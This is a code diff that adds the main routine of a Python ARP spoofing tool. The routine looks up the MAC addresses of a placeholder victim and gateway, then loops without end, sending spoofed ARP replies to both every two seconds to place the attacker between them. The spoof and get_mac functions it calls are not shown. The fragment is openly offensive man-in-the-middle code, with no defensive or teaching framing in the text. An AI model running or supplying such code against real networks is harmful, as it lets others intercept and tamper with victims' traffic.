@@ -44,3 +44,19 @@ def spoof(target_ip, spoof_ip, target_mac):
 ##    \r prints on the same line so it looks cleaner
 #     print(f"\r[+] Packets sent: {sent_packets_count}", end="")
 #     time.sleep(2)
+
+if __name__ == "__main__":
+    victim_ip = "<VICTIM_IP>"
+    gateway_ip = "<GATEWAY_IP>"
+
+    victim_mac = get_mac(victim_ip)
+    gateway_mac = get_mac(gateway_ip)
+
+    print("[+] Victim MAC:", victim_mac)
+    print("[+] Gateway MAC:", gateway_mac)
+    print("[+] Starting ARP spoofing... Press CTRL+C to stop")
+
+    while True:
+        spoof(victim_ip, gateway_ip, victim_mac)
+        spoof(gateway_ip, victim_ip, gateway_mac)
+        time.sleep(2)
